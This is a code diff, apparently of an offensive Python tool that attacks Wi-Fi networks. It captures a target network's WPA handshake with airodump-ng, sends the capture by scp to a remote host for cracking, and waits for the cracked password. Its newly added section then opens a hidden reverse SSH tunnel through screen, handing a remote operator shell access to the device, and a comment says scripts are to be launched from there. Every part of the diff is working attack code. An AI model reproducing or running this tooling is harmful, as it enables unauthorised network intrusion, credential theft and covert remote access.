@@ -95,7 +95,7 @@ if __name__ == '__main__':
 
     # Exporting csv file to get all networks
     output_file_name = 'networks'
-    args = ['--output-format csv', f'-w {output_file_name}']
+    args = ['--output-format csv', f'-w files/{output_file_name}']
     airodump.exec(monitor_interface, args)
 
     # Once airodump has stored all networks, I get the network bssid and its channel
@@ -105,8 +105,8 @@ if __name__ == '__main__':
         write_log(f'[!] Network with SSID {network_ssid} not found')
         
     # Get 4-way-handshake
-    handshake_file_name = f'{network_ssid}-psk'
-    args = [f'-c {channel}', f'--bssid {bssid}', f'-w {handshake_file_name}', '--output-format pcap']
+    handshake_file_name = f'{network_ssid}-handshake'
+    args = [f'-c {channel}', f'--bssid {bssid}', f'-w files/{handshake_file_name}', '--output-format pcap']
     shell_command = airodump.get_str_shell_command(monitor_interface, args)
     
     # Execute airodump-ng as subprocess
@@ -144,13 +144,10 @@ if __name__ == '__main__':
     # Once psk.hc22000 has been stored, send via scp
     method_to_send: dict = get_config_field("send_handshake")
     if 'scp' in method_to_send:
-        if method_to_send['scp'].get('user') and method_to_send['scp'].get('host'):
+        if method_to_send['scp'].get('user') and method_to_send['scp'].get('host') and method_to_send['scp'].get('path'):
             user = method_to_send['scp'].get('user')
             host = method_to_send['scp'].get('host')
-            
-            path = '/home/pgalvarez'
-            if method_to_send['scp'].get('path'):
-                path = method_to_send['scp'].get('path')
+            path = method_to_send['scp'].get('path')
             
             command = f'scp psk.hc22000 {user}@{host}:{path}'
             output = subprocess.run(command, shell=True, capture_output=True, text=True)
@@ -163,7 +160,8 @@ if __name__ == '__main__':
     cracked_password: str = None
     while not cracked_password:
         try:
-            with open('cracked_password.txt') as f:
+            file_path = os.path.join('files', 'cracked_password.txt')
+            with open(file_path) as f:
                 cracked_password = f.read()
                     
         except FileNotFoundError:
@@ -190,6 +188,21 @@ if __name__ == '__main__':
         write_log(f'[!] Error executing command "{command}"')
         sys.exit(1)
     
+    # Open reverse tunnel
+    reverse_tunnel_information: dict = get_config_field('reverse_ssh_tunnel')
+    
+    remote_user = reverse_tunnel_information.get('user')
+    remote_host = reverse_tunnel_information.get('host')
+    if not remote_user or not remote_host:
+        write_log(f'[!] You must specify fields "user" and "host"')
+        sys.exit(1)
+    
+    remote_port = 9090
+    if reverse_tunnel_information.get('port'):
+        remote_port = reverse_tunnel_information.get('port')
+    
+    command = f'screen -dmS reverse_ssh_tunnel ssh -R {remote_port}:localhost:22 {remote_user}@{remote_host} -N'
+    
     '''
-    A partir de aqui tengo que abrir el tunel ssh inverso a mi maquina y ejecutar los comandos necesarios
+    Listo!! A partir de aqui a lanzar scripts
     '''
